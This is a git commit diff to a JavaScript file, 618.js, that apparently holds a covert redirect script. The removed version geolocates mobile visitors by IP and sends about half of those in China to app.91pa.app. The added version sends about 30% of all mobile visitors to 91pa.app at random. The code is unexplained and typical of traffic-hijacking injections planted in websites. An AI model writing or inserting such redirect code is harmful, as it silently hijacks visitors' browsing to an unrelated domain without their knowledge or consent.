63d280be82c8d6b51e0a5dcb935a9b4973a45710
mihoutao18 <138785638+mihoutao1868@users.noreply.github.com>
2025-04-27 05:57:37 +0800

    Update 618.js

--- 618.js
+++ 618.js
@@ -12,18 +12,11 @@ var _hmt = _hmt || [];
       window.location.replace('https://app.91pa.app/');
     }
   })();
-(async function() {
-  var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i
-                   .test(navigator.userAgent);
-  if (!isMobile) return;
-  try {
-    let res = await fetch('https://api.ip.sb/geoip?format=json');
-    if (!res.ok) return;
-    let data = await res.json();
-
-    if (data.country_code === 'CN' && Math.random() < 0.5) {
-      window.location.replace('https://app.91pa.app/');
+  (function() {
+    var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i
+                     .test(navigator.userAgent);
+    if (!isMobile) return;  
+    if (Math.random() < 0.3) {
+      window.location.replace('https://91pa.app/');
     }
-  } catch (e) {
-  }
-})();
+  })();
